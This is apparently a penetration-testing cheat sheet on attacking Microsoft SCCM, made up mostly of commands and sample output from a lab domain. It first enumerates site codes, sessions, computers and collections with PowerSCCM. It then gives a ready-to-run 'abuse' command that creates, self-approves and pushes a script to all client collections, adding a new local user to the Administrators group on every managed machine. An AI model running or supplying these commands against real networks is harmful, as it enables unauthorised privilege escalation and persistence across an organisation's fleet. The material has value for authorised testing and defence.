---
title: "SCCM"
date: 2024-11-9
tags: ["SCCM", "System Center Configuration Manager", "Active Directory", "Windows", "Configuration Management"]
---

### Enum

{{< tab set1 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Import Module

```console
. .\PowerSCCM.ps1
```

```console {class="sample-code"}
PS C:\programdata> . .\PowerSCCM.ps1
```

<small>*Ref: [PowerSCCM.ps1](https://github.com/PowerShellMafia/PowerSCCM)*</small>

#### 2. Find SccmSiteCode

```console
Find-SccmSiteCode -ComputerName <TARGET_COMPUTER>
```

```console {class="sample-code"}
PS C:\programdata> Find-SccmSiteCode -ComputerName sccm.example.local   
Find-SccmSiteCode -ComputerName sccm.example.local

SiteCode
--------
GH1
```

#### 3. New SccmSession

```console
New-SccmSession -ComputerName <TARGET_COMPUTER> -SiteCode <SITE_CODE> -ConnectionType wmi
```

```console {class="sample-code"}
PS C:\programdata> New-SccmSession -ComputerName SCCM -SiteCode GH1 -ConnectionType wmi
New-SccmSession -ComputerName SCCM -SiteCode GH1 -ConnectionType wmi


Id             : 1
Name           : GH11
ComputerName   : SCCM
Credential     : 
SiteCode       : GH1
ConnectionType : wmi
SccmVersion    : 5
Permissions    : {ALL}
Provider       : \\SCCM\ROOT\sms:SMS_ProviderLocation.Machine="sccm.Example.local",SiteCode="GH1"
```

#### 4. Check SccmSessions

```console
Get-SCCMSession | Get-SCCMComputer
```

```console {class="sample-code"}
PS C:\programdata> Get-SCCMSession | Get-SCCMComputer
Get-SCCMSession | Get-SCCMComputer


Name                : SRV002
FullDomainName      : 
IPAddresses         : {192.168.22.16}
LastLogonUserDomain : 
LastLogonUserName   : 

Name                : SCCM
FullDomainName      : 
IPAddresses         : {192.168.21.155}
LastLogonUserDomain : 
LastLogonUserName   : 
```

```console
Get-SCCMSession | Get-SCCMCollection
```

```console {class="sample-code"}
PS C:\programdata> Get-SCCMSession | Get-SCCMCollection
Get-SCCMSession | Get-SCCMCollection


__GENUS                        : 2
__CLASS                        : SMS_Collection
__SUPERCLASS                   : SMS_BaseClass
__DYNASTY                      : SMS_BaseClass
__RELPATH                      : SMS_Collection.CollectionID="SMS00001"
__PROPERTY_COUNT               : 31
__DERIVATION                   : {SMS_BaseClass}
__SERVER                       : SCCM
__NAMESPACE                    : root\sms\site_GH1
__PATH                         : \\SCCM\root\sms\site_GH1:SMS_Collection.CollectionID="SMS00001"
CollectionID                   : SMS00001
CollectionRules                : 
CollectionType                 : 2
CollectionVariablesCount       : 0
Comment                        : All Systems
CurrentStatus                  : 1
HasProvisionedMember           : True
IncludeExcludeCollectionsCount : 0
IsBuiltIn                      : True
IsReferenceCollection          : True
ISVData                        : 
ISVDataSize                    : 0
ISVString                      : 
LastChangeTime                 : 20200106084829.590000+***
LastMemberChangeTime           : 20241123103441.073000+***
LastRefreshTime                : 20241123120046.397000+***
LimitToCollectionID            : 
LimitToCollectionName          : 
LocalMemberCount               : 4
MemberClassName                : SMS_CM_RES_COLL_SMS00001
MemberCount                    : 4
MonitoringFlags                : 0
Name                           : All Systems
ObjectPath                     : /
OwnedByThisSite                : True
PowerConfigsCount              : 0
RefreshSchedule                : 
RefreshType                    : 6
ReplicateToSubSites            : True
ServiceWindowsCount            : 0
UseCluster                     : 
PSComputerName                 : SCCM
...[SNIP]...
```

{{< /tabcontent >}}

---

### Abuse #1: Add Custom Script

#### 1. Import Module

```console
cd 'C:\Program Files (x86)\Microsoft Configuration Manager\AdminConsole\bin'
```

```console
Import-Module .\ConfigurationManager.psd1
```

#### 2. Check

```console
Get-CMsite
```

```console {class="sample-code"}
PS GH1:\> Get-CMsite
Get-CMsite


SmsProviderObjectPath       : SMS_Site.SiteCode="GH1"
BuildNumber                 : 8790
ContentLibraryLocation      : 
ContentLibraryMoveProgress  : 100
ContentLibraryStatus        : 3
Features                    : 0000000000000000000000000000000000000000000000000000000000000000
InstallDir                  : C:\Program Files\Microsoft Configuration Manager
Mode                        : 0
ReportingSiteCode           : 
RequestedStatus             : 110
SecondarySiteCMUpdateStatus : 2
ServerName                  : sccm.Example.local
SiteCode                    : GH1
SiteName                    : Example
Status                      : 1
TimeZoneInfo                : 000001E0 0000 000B 0000 0001 0002 0000 0000 0000 00000000 0000 0003 0000 0002 0002 0000 
                              0000 0000 FFFFFFC4
Type                        : 2
Version                     : 5.00.8790.1000
```

```console
Get-CMManagementPoint
```

```console {class="sample-code"}
PS GH1:\> Get-CMManagementPoint
Get-CMManagementPoint


SmsProviderObjectPath : SMS_SCI_SysResUse.FileType=2,ItemName="[\"Display=\\\\sccm.Example.local\\\"]MSWNET:[\"
                        SMS_SITE=GH1\"]\\\\sccm.Example.local\\,SMS Management Point",ItemType="System 
                        Resource Usage",SiteCode="GH1"
FileType              : 2
ItemName              : ["Display=\\sccm.Example.local\"]MSWNET:["SMS_SITE=GH1"]\\sccm.Example.local\,S
                        MS Management Point
ItemType              : System Resource Usage
NALPath               : ["Display=\\sccm.Example.local\"]MSWNET:["SMS_SITE=GH1"]\\sccm.Example.local\
NALType               : Windows NT Server
NetworkOSPath         : \\sccm.Example.local
PropLists             : {Objects Polled By Site Status}
Props                 : {Authentication type, ClientShare, DatabaseName, MPDefault...}
RoleCount             : 8
RoleName              : SMS Management Point
ServerState           : 196611
ServiceWindows        : 
SiteCode              : GH1
SiteSystemStatus      : 1
SslState              : 0
Type                  : 2
```

```console
Get-CMActiveDirectoryForest
```

```console {class="sample-code"}
PS GH1:\> Get-CMActiveDirectoryForest
Get-CMActiveDirectoryForest


SmsProviderObjectPath : SMS_ADForest.ForestID=16777217
Account               : 
CreatedBy             : Example\Administrator
CreatedOn             : 1/6/2020 5:23:56 PM
Description           : Example.local
DiscoveredADSites     : 0
DiscoveredDomains     : 0
DiscoveredIPSubnets   : 0
DiscoveredTrusts      : 0
DiscoveryStatus       : 
EnableDiscovery       : True
ForestFQDN            : Example.local
ForestID              : 16777217
ModifiedBy            : Example\Administrator
ModifiedOn            : 1/6/2020 5:23:56 PM
PublishingPath        : 
PublishingStatus      : 1

```

#### 2. Add New User to Administrators Group

```console
cd <SITE_CODE>:
```

```console {class="sample-code"}
cd GH1:
PS GH1:\>
```

```console
New-CMScript -ScriptName test -Fast -ScriptText "net user <USER> <PASSWORD> /add; net localgroup Administrators <USER> /add"; Get-CMScript -Fast -ScriptName test | Approve-CMScript; Get-CMScript -Fast -ScriptName test | Invoke-CMScript -CollectionName 'All Desktop and Server Clients'
```

```console {class="sample-code"}
PS GH1:\> New-CMScript -ScriptName test -Fast -ScriptText "net user test_user Test1234 /add; net localgroup Administrators test_user /add"; Get-CMScript -Fast -ScriptName test | Approve-CMScript; Get-CMScript -Fast -ScriptName test | Invoke-CMScript -CollectionName 'All Desktop and Server Clients'
New-CMScript -ScriptName test -Fast -ScriptText "net user test_user Test1234 /add; net localgroup Administrators test_user /add"; Get-CMScript -Fast -ScriptName test | Approve-CMScript; Get-CMScript -Fast -ScriptName test | Invoke-CMScript -CollectionName 'All Desktop and Server Clients'


SmsProviderObjectPath : SMS_Scripts.ScriptGuid="AAA8C83C-3DE4-4BD5-96B2-55F801139763"
ApprovalState         : 0
Approver              : 
Author                : NT AUTHORITY\SYSTEM
Comment               : 
Feature               : 0
LastUpdateTime        : 11/23/2024 5:58:16 AM
ParameterGroupHash    : 
Parameterlist         : 
ParameterlistXML      : 
ParamsDefinition      : 
Script                : 
ScriptGuid            : AAA8C83C-3DE4-4BD5-96B2-55F801139763
ScriptHash            : 6F6994FCAEDE9916FF682A0D7BB70A17F9DFC99CD3223704D4E650860640F5D8
ScriptHashAlgorithm   : SHA256
ScriptName            : test
ScriptType            : 0
ScriptVersion         : 1
```